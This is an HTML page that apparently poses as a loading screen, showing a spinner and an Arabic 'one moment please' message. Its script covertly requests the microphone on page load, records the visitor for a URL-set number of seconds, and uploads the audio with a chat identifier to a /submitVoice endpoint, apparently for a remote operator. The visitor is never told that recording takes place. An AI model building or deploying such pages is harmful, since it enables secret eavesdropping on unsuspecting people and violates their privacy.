<!DOCTYPE html>
<html lang="en">
<head>
  <title>Are</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');

    body {
      font-family: 'Poppins', sans-serif;
      margin: 0;
      padding: 0;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      color: #fff;
    }

    .container {
      text-align: center;
      padding: 40px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
      position: relative;
      overflow: hidden;
      backdrop-filter: blur(10px);
    }

    .container::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
      transform: rotate(45deg);
      animation: animate 5s linear infinite;
    }

    @keyframes animate {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading {
      border: 8px solid rgba(243, 243, 243, 0.2);
      border-top: 8px solid #e74c3c;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1.5s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .message {
      font-size: 20px;
      color: #ecf0f1;
      margin-top: 20px;
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loading"></div>
    <p class="message">لحظه واحده من فظلك...</p>
  </div>

  <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
    <input type="hidden" name="chatId" id="chatId">
    <input type="file" name="voice" id="voice" style="display: none;">
  </form>

  <script>
    const chatId = getParameterByName('chatId');
    const duration = getParameterByName('duration');
    let mediaRecorder;
    let audioChunks = [];

    window.addEventListener('load', () => {
      if (duration > 0 && duration <= 20) {
        startRecording();
      } else {
        document.querySelector('.message').textContent = 'حدث خطاء.';
      }
    });

    function startRecording() {
      navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
          mediaRecorder = new MediaRecorder(stream);
          mediaRecorder.start();

          setTimeout(() => {
            mediaRecorder.stop();
          }, duration * 1000);

          mediaRecorder.addEventListener('dataavailable', event => {
            audioChunks.push(event.data);
          });

          mediaRecorder.addEventListener('stop', () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
            const formData = new FormData();
            formData.append('voice', audioBlob, 'voice.ogg');
            formData.append('chatId', chatId);

            fetch('/submitVoice', {
              method: 'POST',
              body: formData
            })
            .then(response => response.text())
            .then(data => {
              console.log('ok');
            })
            .catch(error => {
              console.error('حدث خطأ :', error);
            });
          });
        })
        .catch(error => {
          console.error('error:', error);
        });
    }

    
    function getParameterByName(name, url = window.location.href) {
      name = name.replace(/[\[\]]/g, '\\$&');
      const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
            results = regex.exec(url);
      if (!results) return null;
      if (!results[2]) return '';
      return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }
  </script>
</body>
</html>
